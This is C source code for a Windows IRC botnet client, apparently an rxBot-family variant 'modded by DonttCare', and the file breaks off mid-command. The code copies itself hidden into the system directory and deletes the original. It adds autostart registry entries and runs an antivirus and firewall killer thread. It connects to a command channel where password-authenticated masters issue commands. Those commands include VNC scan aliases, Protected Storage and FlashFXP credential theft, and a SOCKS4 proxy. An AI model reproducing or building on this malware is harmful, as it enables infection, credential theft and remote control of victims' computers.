/*
Nzm Harcore modded by DonttCare

*/

#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../config/cfg.h"
#include "../../headers/passwd.h"
#include "../../headers/globals.h"
#include "../../headers/externs.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	char logbuf[LOGLINE],fname[_MAX_FNAME],ext[_MAX_EXT],rfilename[MAX_PATH],cfilename[MAX_PATH],sysdir[MAX_PATH];

	int i = 0, err = 0;
	DWORD id=0;
	BOOL bkpserver = FALSE;

	#ifndef NO_EHANDLER
	// install exception handler
	DWORD handler = (DWORD)_except_handler;
    _asm
    {                           // Build EXCEPTION_REGISTRATION record:
        push    handler         // Address of handler function
        push    FS:[0]          // Address of previous handler
        mov     FS:[0],ESP      // Install new EXECEPTION_REGISTRATION
    }
	if (sp2_mod) {
	sp2mod();
}

  #endif

	// record start time
	started = GetTickCount() / 1000;
	// re-seed random numbers
	srand(GetTickCount());

	#ifdef DEBUG_LOGGING
	opendebuglog();
	#endif

	#ifndef NO_CRYPT // Don't decrypt password here
	decryptstrings((sizeof((char *)authost) / sizeof(LPTSTR)), (sizeof((char *)versionlist) / sizeof(LPTSTR)));
	#endif

	LoadDLLs(); // load all the dlls and functions here

	// hide system messages if bot crashes
	fSetErrorMode(SEM_NOGPFAULTERRORBOX);

	// check if this exe is running already
	if (WaitForSingleObject(CreateMutex(NULL, FALSE, botid), 30000) == WAIT_TIMEOUT)
		ExitProcess(EXIT_FAILURE);

	WSADATA WSAdata;
	if ((err = fWSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0)
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2 ) {
		fWSACleanup();
		return 0;
	}

	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);

	if (strstr(cfilename, sysdir) == NULL) {
		char tmpfilename[MAX_PATH];
		if (rndfilename) {
			for (i=0;(unsigned int)i < (strlen(filename) - 4);i++)
				filename[i] = (char)((rand() % 26) + 97);
		}
		sprintf(tmpfilename, "%s\\%s", sysdir, filename);

		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			} else
				break; // just continue, it's not worth retrying.
		}
		SetFileTime(tmpfilename);
		SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
		#ifdef DEBUG_CONSOLE
		sinfo.wShowWindow = SW_SHOW;
		#else
		sinfo.wShowWindow = SW_HIDE;
		#endif

		char cmdline[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);

		if (CreateProcess(tmpfilename, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
	}

	#ifdef DEBUG_CONSOLE
	OpenConsole();
	printf("Debugging console enabled.\n\n");
	#endif

	#ifndef NO_MELT
	// now delete it
	if (__argc > 2) {
		// now the clone is running --> kill original exe
		HANDLE hProcessOrig = (HANDLE) atoi(__argv[1]);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);

		if (__argv[2]) {
			Sleep(2000); //wait for 2 sec to make sure process has fully exited
			DeleteFile(__argv[2]);
		}
	}
	#endif

	if ((AutoStart) && !(noadvapi32))
		AutoStartRegs(rfilename);

	sprintf(logbuf,"4<<12[MAIN]: Bot started.4>>");
	addthread(logbuf,MAIN_THREAD,NULL);
	addlog(logbuf);

	// remove the following line if you don't want any predefined aliases
	memset(aliases, 0, sizeof(aliases));
	addpredefinedaliases();
	addalias("vnc85", "advscan vnc 100 0 800 85.x.x.x"); \
	addalias("vnc84", "advscan vnc 100 0 800 84.x.x.x"); \
	addalias("vnc86", "advscan vnc 100 0 800 86.x.x.x"); \
	addalias("vncrooter85", "advscan vncrooter 100 0 800 85.x.x.x"); \
	addalias("vncrooter84", "advscan vncrooter 100 0 800 84.x.x.x"); \
	addalias("vncrooter86", "advscan vncrooter 100 0 800 86.x.x.x"); 

    #ifndef NO_AVFW_KILL
	sprintf(logbuf,"4<<12[PROCS]: AV/FW Killer active.4>>");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &kill_av, NULL, 0, &id)) == NULL)
		sprintf(logbuf,"4<<12[PROCS]: Failed to start AV/FW killer thread, error: <%d>4>>.", GetLastError());
	addlog(logbuf);
    #endif

    #ifndef NO_SECSYSTEM
	sprintf(logbuf,"4<<12[SECURE]: System secure monitor active.4>>");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoSecure, NULL, 0, &id)) == NULL)
		sprintf(logbuf,"4<<12[SECURE]: Failed to start secure thread, error: <%d>.4>>", GetLastError());
	addlog(logbuf);
    #endif

    #ifndef NO_REGISTRY
	sprintf(logbuf,"4<<12[SECURE]: Registry monitor active.4>>.");
	i=addthread(logbuf,KILLER_THREAD,NULL);
	if ((threads[i].tHandle = CreateThread(NULL, 0, &AutoRegistry, (LPVOID)&rfilename, 0, &id)) == NULL)
		sprintf(logbuf,"[SECURE]: Failed to start registry thread, error: <%d>.", GetLastError());
	addlog(logbuf);
    #endif

	#ifndef NO_IDENT
	if (findthreadid(IDENT_THREAD) == 0) {
		sprintf(logbuf,"4<<12[IDENTD]: Server running on Port: 113.4>>");
		i = addthread(logbuf,IDENT_THREAD,NULL);
		if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
			sprintf(logbuf,"4<<12[IDENTD]: Failed to start server, error: <%d>.4>>", GetLastError());
		addlog(logbuf);
	}
	#endif

			// set version while bot is running
		current_version=rand()%(sizeof(versionlist)/sizeof(*versionlist)); // fixed

	// copy settings into main irc structure
	strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
	mainirc.port = port;
	strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
	strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
	mainirc.spy = 0;

	while (1) {
		for (i = 0; i < 6; i++) {
			#ifndef NO_CONNCHECK
			DWORD cstat;
			// check if we're connected to the internet... if not, then wait 5mins and try again
			if (!nowininet) if (fInternetGetConnectedState(&cstat, 0) == FALSE) {
				Sleep(30000);
				continue;
			}
			#endif

			success = FALSE;
			if ((err = irc_connect((LPVOID)&mainirc)) == 2)
				break; // break out of the loop

			if (success) i--; // if we're successful in connecting, decrease i by 1;

			// irc_connect didn't return 2, so we need to sleep then reconnect
			Sleep(3000);
		}

		if (err == 2) break; // break out of the loop and close

		if (bkpserver) {
			strncpy(mainirc.host, server, sizeof(mainirc.host)-1);
			mainirc.port = port;
			strncpy(mainirc.channel, channel, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass, sizeof(mainirc.chanpass)-1);
			bkpserver = FALSE;
		}
		else if (!bkpserver && server2[0] != '\0') {
		    strncpy(mainirc.host, server2, sizeof(mainirc.host)-1);
			mainirc.port = port2;
			strncpy(mainirc.channel, channel2, sizeof(mainirc.channel)-1);
			strncpy(mainirc.chanpass, chanpass2, sizeof(mainirc.chanpass)-1);
			bkpserver = TRUE;
		}
	}

	// cleanup;
	killthreadall();
	fWSACleanup();

	return 0;
}

// connect function used by the original bot and all clones/spies
DWORD WINAPI irc_connect(LPVOID param)
{
	SOCKET sock;
	SOCKADDR_IN ssin;

	char *nick1, nickbuf[MAXNICKLEN];

	int rval;

	IRC irc = *((IRC *)param);
	IRC *ircs = (IRC *)param;
	ircs->gotinfo = TRUE;

	while (1) {
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned int)irc.port);
		if ((ssin.sin_addr.s_addr=ResolveAddress(irc.host)) == 0)
			return 0;

		memset(nickbuf, 0, sizeof(nickbuf));
		nick1 = rndnick(nickbuf, nicktype, nickprefix);
		strncpy(threads[irc.threadnum].nick, nick1, sizeof(threads[irc.threadnum].nick)-1);

		sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		threads[irc.threadnum].sock = sock;
		if (fconnect(sock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
			fclosesocket(sock);
			FlushDNSCache();
			Sleep(2000);
			continue;
		}

		#ifdef DEBUG_CONSOLE
		printf("Bot started and connect to %s.\n", irc.host);
		#endif
		addlogv("4<<12[MAIN]: Connected to %s.4>>", irc.host);

		rval = irc_receiveloop(sock, irc.channel, irc.chanpass, nick1, irc.sock, irc.hchan, irc.host, irc.spy);
		fclosesocket(sock);

		if (rval == 0)
			continue;
		else if (rval == 1) {	//Disconnect (sleep 15 mins, reconnect..)
			Sleep(900000);
			continue;
		}
		else if (rval == 2)
			break;	//Quit
	}
	clearthread(irc.threadnum);

	return rval;
}

// receive loop for bots/spies
int irc_receiveloop(SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server, int spy)
{
	// main receive buffer
	char buffer[4096], masters[MAXLOGINS][128], *lines[MAX_LINES], str[18], login[128], host[160];
	int i, j, repeat, in_channel=0;

	for (i = 0; i < MAXLOGINS; i++)
		masters[i][0] = '\0';

	if (serverpass[0] != '\0')
		irc_sendv(sock,"PASS %s\r\n",serverpass);

 	sprintf(login, "NICK %s\r\n"
				   "USER %s 0 0 :%s\r\n", nick1, rndnick(str,LETTERNICK, FALSE), nick1);

	#ifdef DEBUG_LOGGING
	debuglog(login,FALSE);
	#endif

	if (fsend(sock, login, strlen(login), 0) == SOCKET_ERROR) {
		fclosesocket(sock);
		Sleep(5000);
		return 0;
	}

	// loop forever
	while(1) {
		memset(buffer, 0, sizeof(buffer));
		// if recv() returns 0, that means that the connection has been lost.
		if (frecv(sock, buffer, sizeof(buffer), 0) <= 0)
			break;

		// FIX ME: Truncation occurs here
		// split lines up if multiple lines received at once, and parse each line
		i = Split(buffer,&lines);
		for (j=0;j < i;j++) {
			repeat=1;
			do {
				#ifdef DEBUG_LOGGING
				debuglog(lines[j]);
				#endif

				repeat = irc_parseline(lines[j], sock, channel, chanpass, nick1, server, masters, host, &in_channel, repeat, spy);
				repeat--;

				if (repeat > 0)
					Sleep(FLOOD_DELAY);
			} while (repeat > 0);

			switch (repeat) {
			case -1:
				return 0; // Reconnect
			case -2:
				return 1; // Disconnect
			case -3:
				return 2; // Quit
			default:
				break;
			}
		}
	}

	return 0;
}

// function to parse lines for the bot and clones
int irc_parseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, char *server, char masters[][128], char *host, int *in_channel, int repeat, int spy)
{
	char line1[IRCLINE], line2[IRCLINE], sendbuf[IRCLINE],ntmp[12], ntmp2[3];
	char *a[MAXTOKENS], a0[128], nick[MAXNICKLEN], user[24];
	unsigned char parameters[256];

	int i, ii, s=3;
	DWORD id=0;
	BOOL ismaster = FALSE, silent = FALSE, notice = FALSE, usevars = FALSE;

	memset(sendbuf, 0, sizeof(sendbuf));

	strncpy(nick, nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	strncpy(line1, line, sizeof(line1)-1);
	char *x = strstr(line1, " :");

	// split the line up into seperate words
	strncpy(line2, line1, sizeof(line2)-1);
	a[0] = strtok(line2, " ");
	for (i = 1; i < MAXTOKENS; i++)
		a[i] = strtok(NULL, " ");

	if (a[0] == NULL || a[1] == NULL)
		return 1;

	memset(parameters,0,sizeof(parameters));
	for (i=31;i>=0;i--) {
		if (!a[i])
			continue;
		if ((a[i][0]=='-') && (a[i][2]==0)) {
			//Looks like a valid parameter..
			parameters[a[i][1]]=1;
			a[i][0]=0;
			a[i][1]=0;
			a[i][2]=0;
			a[i]=NULL;
		} else
			break;
	}

	if (parameters['s'])
		silent=TRUE;
	if (parameters['n']) {
		silent=FALSE;
		notice=TRUE;
	}

	if (a[0][0] != '\n') {
		strncpy(a0,  a[0], sizeof(a0)-1);
		strncpy(user, a[0]+1, sizeof(user)-1);
		strtok(user, "!");
	}

	// pong if we get a ping request from the server
	if (strcmp("PING", a[0]) == 0) {
		a[0][1]='O';

		//irc_sendv(sock, "PONG %s\r\n", a[1]+1);
		irc_sendv(sock, "PONG %s\r\n", a[1]);
		if (*in_channel == 0)
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);

		return 1;
	}

	// looks like we're connected to the server, let's join the channel
	if (strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) {
		irc_sendv(sock, "USERHOST %s\r\n", nick1); // get our hostname
		#ifndef NO_MODEONCONN
		irc_sendv(sock, "MODE %s %s\r\n", nick1, modeonconn);
		#else
		irc_sendv(sock, "MODE %s +i\r\n", nick1);
		#endif
		irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		success = TRUE;
		return 1;
	}

	// get host
	if (strcmp("302", a[1]) == 0) {
		char *h = strstr(a[3], "@");
		if (h != NULL)
			strncpy(host,  h+1, 159);
		return 1;
	}

	// nick already in use
	if (strcmp("433", a[1]) == 0) {
		rndnick(nick1, nicktype, nickprefix);
		irc_sendv(sock, "NICK %s\r\n", nick1);
		return 1;
	}

	// check if user is logged in
	for (i = 0; i < MAXLOGINS; i++) {
		if (strcmp(masters[i], a0) == 0)
			ismaster = TRUE;
	}

	//rejoin channel if we're kicked, otherwise reset master if it was our master that got kicked
	if (strcmp("KICK", a[1]) == 0) {
		char *knick;
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] == '\0') continue;
			strncpy(a0,  masters[i], sizeof(a0)-1);
			knick = user;
			if (knick != NULL && a[3] != NULL)
				if (strcmp(knick, a[3]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf,"4<<12[MAIN]: User %s logged out.4>>", knick);
					irc_sendv(sock, "NOTICE %s :%s\r\n", knick, sendbuf);
					addlog(sendbuf);
				}
		}
		if (strcmp(nick1, a[3]) == 0) {
			*in_channel = 0;
			irc_sendv(sock, "JOIN %s %s\r\n", channel, chanpass);
		}
		return 1;
	}

	if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = user, *newnck = a[2] + 1;
		for (i=0;i<MAXLOGINS;i++) {
			if (strcmp(masters[i],a0) == 0) {
				//Master has changed nick
				//Lets TRY to rebuild the master-usermask.
				char *identandhost=strchr(a0,'!');
				if (identandhost) {
					masters[i][0]=':';	//Prefix
					strcpy(&masters[i][1],newnck);
					strcat(&masters[i][2],identandhost);
				}
			}
		}
		if(oldnck != NULL && newnck != NULL) {
			if(strcmp(oldnck, nick1) == 0) {
				strncpy(nick1, newnck, 15);
				return 1;
			}
			char debugbuf[100];
			for (i = 0; i < MAXLOGINS; i++) {
				if(masters[i][0] != '\0' && strcmp(masters[i], a0) == 0) {
					char *ih = strchr(a0, '!');
					if(ih == NULL || strlen(newnck) + strlen(ih) > 126)
						return 1;
					sprintf(masters[i], ":%s%s", newnck, ih);
					irc_privmsg(sock, channel, debugbuf, FALSE);
					break;
				}
			}
		}

		return 1;
	}

	// reset master if master parts or quits
	if (strcmp("PART", a[1]) == 0 || strcmp("QUIT", a[1]) == 0) {
		for (i = 0; i < MAXLOGINS; i++) {
			if (masters[i][0] != '\0') {
				if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "4<<12[MAIN]: User: %s logged out.4>>", user);
					addlog(sendbuf);
					if (strcmp("PART", a[1]) == 0)
						irc_sendv(sock, "NOTICE %s :%s\r\n", a[0] + 1, sendbuf);
					return 1;
				}
			}
		}
	}

	// we've successfully joined the channel
	if (strcmp("353", a[1]) == 0) {
		if (strcmp(channel, a[4]) == 0)
			*in_channel = 1;
		addlogv("4<<12[MAIN]: Joined channel: %s.4>>", a[4]);
		return 1;
	}

	// if we get a privmsg, notice or topic command, start parsing it
	if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0 || (strcmp("332", a[1]) == 0 && topiccmd)) {
		if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {	// it's a privmsg/notice
			if (strcmp("NOTICE", a[1]) == 0)
				notice = TRUE;
			if (a[2] == NULL) return 1;

			if (strstr(a[2], "#") == NULL || notice)
				a[2] = user;

			if (a[3] == NULL) return 1;
			a[3]++;
			// if our nick is the first part of the privmsg, then we should look at a[4] for a command, a[3] otherwise.
			if (a[3] && nick1)
				if (strncmp(nick, a[3], strlen(nick)) == 0)
					s = 4;
				else
					s = 3;
			if (a[s] == NULL) return 1;
			// if someone asks for our version, send version reply
			// new version code that doesn't crash bot
			if (strcmp("\1VERSION\1", a[s]) == 0) 
				if (a[2][0] != '#' && versionlist[current_version][0] != '\0') {
					irc_sendv(sock, "NOTICE %s :\1VERSION %s\1\r\n", a[2], (char *)versionlist[current_version]);
					return 1;
				}
			else if (strcmp("\1PING", a[s]) == 0) 
				if (a[s+1] != NULL && a[2][0] != '#') {
					irc_sendv(sock, "NOTICE %s :\1PING %s\1\r\n", a[2], a[s+1]);
					return 1;
				}
		} else  { // it's a topic command
			s = 4;
			a[4]++;
			a[2] = a[3];
		}

		#ifndef NO_DCC
		if (strcmp("\1DCC", a[s]) == 0) {
			if (strcmp("SEND", a[s+1]) == 0) {
				if (ismaster) {
					DCC dcc;
					sprintf(dcc.filename,"%s",a[s+2]);
					sprintf(dcc.host,"%s",a[s+3]);
					dcc.port = atoi(a[s+4]);
					dcc.sock = sock;
					strncpy(dcc.sendto,user,sizeof(dcc.sendto)-1);
					dcc.notice = notice;
					dcc.silent = silent;

					sprintf(sendbuf, "4<<12[DCC]: Receive file: '%s' from user: %s4>>.", dcc.filename,dcc.sendto);
					dcc.threadnum=addthread(sendbuf,DCC_THREAD,NULL);
					if (threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &DCCGetThread, (LPVOID)&dcc, 0, &id)) {
						while (dcc.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"4<<12[DCC]: Failed to start transfer thread, error: <%d>4>>.", GetLastError());
				} else
					sprintf(sendbuf, "4<<12[DCC]: Receive file: '%s' failed from unauthorized user: %s4>>.", a[s+2], user);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("CHAT", a[s+1]) == 0) {
				if (ismaster) {
					if (findthreadid(DCCCHAT_THREAD) == 0) {
						DCC dcc;
						sprintf(dcc.host,"%s",a[s+3]);
						dcc.port = atoi(a[s+4]);
						dcc.sock = sock;
						strncpy(dcc.sendto,user,sizeof(dcc.sendto)-1);
						dcc.notice = notice;
						dcc.silent = silent;

						sprintf(sendbuf, "4<<12[DCC]: Chat from user: %s.4>>", user);
						dcc.threadnum=addthread(sendbuf,DCCCHAT_THREAD,NULL);
						if (threads[dcc.threadnum].tHandle = CreateThread(NULL, 0, &DCCChatThread, (LPVOID)&dcc, 0, &id)) {
							while (dcc.gotinfo == FALSE)
								Sleep(50);
						} else
							printf(sendbuf,"4<<12[DCC]: Failed to start chat thread, error: <%d>.4>>", GetLastError());
					} else
						sprintf(sendbuf,"4<<12[DCC]: Chat already active with user: %s.4>>",user);
				} else
					sprintf(sendbuf,"4<<12[DCC]: Chat failed by unauthorized user: %s.4>>",user);
				addlog(sendbuf);

				return 1;
			}
		} else
		#endif

		if (a[s]++[0] != prefix)
			return 1;

		else if (strcmp("idontwannadumpinfo",a[s]) == 0) {
			irc_sendv(sock, "NOTICE %s [DUMP]:Gathering Info.\r\n", user);
			irc_sendv(sock, "NOTICE %s [DUMP]: Login: %s Server: %s Channel: %s Chanpass: %s BotID: %s\r\n", user, password, server, channel, chanpass, botid);
		}

		else if (strcmp("idontwannareconnect",a[s]) == 0) {
				irc_sendv(sock, "QUIT :reconnecting\r\n");
				addlog("4<<12[MAIN]: Reconnecting.4>>");

				return 0;
			}
        // see if someone is logging in
		if (strcmp("login", a[s]) == 0 || strcmp("l", a[s]) == 0) {
			if (a[s+1] == NULL || ismaster) 
				return 1;

			char *u = strtok(a[0], "!") + 1, *h = strtok(NULL, "\0");
			h = strtok(h, "~");
			#ifndef NO_CRYPT
			Crypt(a[s+1],strlen(a[s+1]),"",0); // Encrypt password to compare to stored password
			#endif
			if (strcmp(password, a[s+1]) != 0) {
				irc_sendv(sock, "NOTICE %s :Password Failed [%s!%s].\r\n", user, user, h);
				//irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user);
				sprintf(sendbuf, "4<<12[MAIN]: *Failed pass auth by: [%s!%s].4>>", u, h);
				addlog(sendbuf);
				return 1; 
			}
	
			BOOL nick_ok = FALSE; 


         if (authnick[0][0] == '\0') nick_ok = TRUE; 
         else { 
            for (i=0; i < authsize; i++) { 
               if (stricmp(authnick[i], user) == 0) nick_ok = TRUE; // case insensitive 
            } 
         } 
         if (!nick_ok || strcmp(password, a[s+1]) != 0) { 
            irc_sendv(sock, "NOTICE %s :Auth Failed [%s!%s]. Error: %d\r\n", user, user, h, (!nick_ok)?(1):(2)); 
           // irc_sendv(sock, "NOTICE %s :Your attempt has been logged.\r\n", user); 
			addlogv("[MAIN]: *Failed authentication by: [%s!%s]. Error: %d", user, h, (!nick_ok)?(001):(002)); 
            return 1; 
         } 

			for (i = 0; i < MAXLOGINS; i++) {
				if (a[s+1] == NULL) return 1;
				if (masters[i][0] != '\0') continue;
				if (strcmp(password, a[s+1]) == 0) {
					strncpy(masters[i],  a0, 127);
					if (!silent) irc_privmsg(sock, a[2], "4<<12Password accepted4>> 4<<12Type commandlist4>>", notice);
					addlogv("4<<12[MAIN]: User: %s logged in.4>>", user);
					break;
				}
			}
			return 1;
		}

		if ((ismaster || strcmp("332", a[1]) == 0) && spy == 0) {
			// commands requiring no parameters
			// check if the command matches an alias's name
			for (i = 0; i < anum; i++) {
				if (strcmp(aliases[i].name, a[s]) == 0) {
					char *sc = strstr(line, " :");
					if (sc == NULL) return 1;
					sc[2] = prefix;
					sc[3] = prefix;
					strncpy(sc+4, aliases[i].command, 159);

					// process '$x-' parameter variables
					for (ii=15; ii > 0; ii--) {
						sprintf(ntmp, "$%d-", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii+1] != NULL) {
							x = x + strlen(aliases[i].name);
							if (x != NULL) {
								char *y = strstr(x, a[s+ii]);
								if (y != NULL) replacestr(line, ntmp, y);
							}
						}
						else if (a[s+ii+1] == NULL) {
							strncpy(ntmp2, ntmp, 2);
							ntmp2[2] = '\0';
							replacestr(line, ntmp, ntmp2);
						}
					}

					// process '$x' parameter variables
					for (ii=16; ii > 0; ii--){
						sprintf(ntmp, "$%d", ii);
						if (strstr(line, ntmp) != NULL && a[s+ii] != NULL)
							replacestr(line, ntmp, a[s+ii]);
					}

					usevars = TRUE;
					break;
				}
			}

			if (a[s][0] == prefix || usevars) {
				// process variables
				replacestr(line, "$me", nick1); // bot's nick
				replacestr(line, "$user", user); // user's nick
				replacestr(line, "$chan", a[2]); // channel name (or user name if this is a privmsg to the bot)
				replacestr(line, "$rndnick", rndnick(ntmp)); // random string of 4-7 characters
				replacestr(line, "$server", server); // name of current server

				// process '$chr()' variables
				while (strstr(line, "$chr(") != NULL) {
					char *c = strstr(line, "$chr(");
					strncpy(ntmp, c+5, 4);
					strtok(ntmp, ")");
					if (ntmp[0] < 48 || ntmp[0] > 57)
						strncpy(ntmp, "63", 3);
					if (atoi(ntmp) > 0)
						ntmp2[0] = (char)atoi(ntmp);
					else
						ntmp2[0] = (char)((rand()%96) + 32);
					ntmp2[1] = '\0';
					ii = strlen(ntmp);
					memset(ntmp, 0, sizeof(ntmp));
					strncpy(ntmp, c, ii+6);
					replacestr(line, ntmp, ntmp2);
				}

				// re-split the line into seperate words
				strncpy(line1, line, sizeof(line1)-1);
				strncpy(line2, line1, sizeof(line2)-1);
				a[0] = strtok(line2, " ");
				for (i = 1; i < 32; i++)
					a[i] = strtok(NULL, " ");
				if (a[s] == NULL)
					return 1;
				a[s] += 3;
			}

			else if (strcmp("flashfxp", a[s]) == 0) {
   if(FlashFXP(0, 0, 0, 0)) irc_privmsg(sock, a[2], "Found FlashFXP History File", notice);
   else if(!silent) irc_privmsg(sock, a[2], "No FlashFXP History File Found!", notice);
}
else if (strcmp("flashfxp.parse", a[s]) == 0) {
   FlashFXP(1, sock, a[2], notice);
   if(!silent) irc_privmsg(sock, a[2], "Parsing done", notice);
}
else if (strcmp("pstore", a[s]) == 0) {
				pststrct pStorInfo;
				pStorInfo.sock = sock;
				strcpy(pStorInfo.chan,a[2]);
				sprintf(sendbuf, "4<<12[PSTORE]: Starting Pstore.4>>");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				sprintf(sendbuf, "4<<12[PSTORE]: Pstore Started.4>>");
				pStorInfo.threadnum = addthread(sendbuf, PSTORE_THREAD, NULL);
				if (threads[pStorInfo.threadnum].tHandle = CreateThread(NULL, 0, &pstore, (LPVOID)&pStorInfo, 0, &id)) {
						while (pStorInfo.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"4<<12[PSTORE]: <12Failed to start PStore thread, error: <%d>.4>>", GetLastError());
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
			}
			else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				if (a[s+1]) {
					i = atoi(a[s+1]);
					if(i >= 0 && i < MAXLOGINS) {
    					if(masters[i][0] != '\0') {
        					sprintf(sendbuf, "4<<12[MAIN]: User %s logged out.4>>", masters[i]+1);
        					masters[i][0] = '\0';
        				} else
        					sprintf(sendbuf, "4<<12[MAIN]: No user logged in at slot: %d.4>>", i);
					} else
						sprintf(sendbuf, "4<<12[MAIN]: Invalid login slot number: %d.4>>", i);
				} else {
					for (i = 0; i < MAXLOGINS; i++)
						if (strcmp(masters[i], a[0]) == 0) {
							masters[i][0] = '\0';
							sprintf(sendbuf, "4<<12[MAIN]: User %s logged out.4>>", user);
							break;
						}
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#ifndef NO_BOTVERSION
			else if (strcmp("version", a[s]) == 0 || strcmp("ver", a[s]) == 0) {
				sprintf(sendbuf, "[MAIN]: %s", version);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif
			#ifndef NO_SECURE
			else if (strcmp("lockdown", a[s]) == 0 || strcmp("ld.on", a[s]) == 0
				|| strcmp("lockdown", a[s]) == 0 || strcmp("ld.off", a[s]) == 0) {
				SECURE secure;
				secure.secure = (strcmp("secure",a[s])==0 || strcmp("sec",a[s])==0);
				_snprintf(secure.chan, sizeof(secure.chan), a[2]);
				secure.sock = sock;
				secure.notice = notice;
				secure.silent = silent;

				_snprintf(sendbuf, sizeof(sendbuf),"4<<12[SECURE]: %s system.4>>", ((secure.secure)?("Securing"):("Unsecuring")));
				secure.threadnum = addthread(sendbuf, SECURE_THREAD, NULL);
				if (threads[secure.threadnum].tHandle = CreateThread(NULL, 0, &SecureThread, (LPVOID)&secure, 0, &id)) {
					while (secure.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"4<<12[SECURE]: Failed to start secure thread, error: <%d>.4>>", GetLastError());
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_SOCK4SERV
			else if (strcmp("socks4", a[s]) == 0 || strcmp("sck4", a[s]) == 0) {
				SOCKS4 socks4;
				socks4.port = ((a[s+1])?((atoi(a[s+1])==0)?(socks4port):(atoi(a[s+1]))):(socks4port));
				((a[s+2])?(_snprintf(socks4.userid,sizeof(socks4.userid),a[s+2])):
					((parameters['a'])?(_snprintf(socks4.userid,sizeof(socks4.userid),user)):(socks4.userid[0]='\0')));
				socks4.sock = sock;
				socks4.notice = notice;
				socks4.silent = silent;
				_snprintf(socks4.chan,sizeof(socks4.chan),a[2]);

				sprintf(sendbuf, "4<<12[SOCKS4]: Server started on: %s:%d.4>>", GetIP(sock), socks4.port);
				socks4.threadnum=addthread(sendbuf,SOCKS4_THREAD,NULL);
				if (threads[socks4.threadnum].tHandle = CreateThread(NULL, 0, &Socks4Thread, (LPVOID)&socks4, 0, &id)) {
					while(socks4.gotinfo == FALSE)
						Sleep(50);
				} else
					addlogv("4<<12[SOCKS4]: Failed to start server thread, error: <%d>.4>>", GetLastError());

				return 1;
			}
			else if (strcmp("socks4stop",a[s]) == 0 || strcmp("stopsocks",a[s]) == 0) {
